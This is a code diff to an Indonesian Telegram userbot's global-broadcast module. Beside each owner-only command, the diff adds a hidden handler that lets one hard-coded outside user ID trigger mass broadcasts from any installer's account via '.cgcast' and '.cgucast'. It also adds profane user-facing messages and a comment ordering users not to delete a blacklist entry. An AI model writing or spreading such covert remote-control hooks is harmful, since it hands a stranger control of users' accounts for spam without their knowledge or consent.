@@ -13,10 +13,15 @@ from userbot.events import register
 
 GCAST_BLACKLIST = [
     -1001681347365,  # MemekJembot
+    -1001473548283,  # SharingUserbot
 ]
 
 
+# BLACKLIST NYA JANGAN DI HAPUS NGENTOD.
+
+
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@register(incoming=True, from_users=1447438514, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -24,7 +29,7 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Berikan Sebuah Pesan atau Reply**")
+        await event.edit("**PESAN NYA MANA KONTOLLL?**")
         return
     kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
     er = 0
@@ -46,6 +51,7 @@ async def gcast(event):
 
 
 @register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
+@register(incoming=True, from_users=1447438514, pattern=r"^\.cgucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -53,7 +59,7 @@ async def gucast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Berikan Sebuah Pesan atau Reply**")
+        await event.edit("**PESAN NYA MANA KONTOLLL?**")
         return
     kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
     er = 0
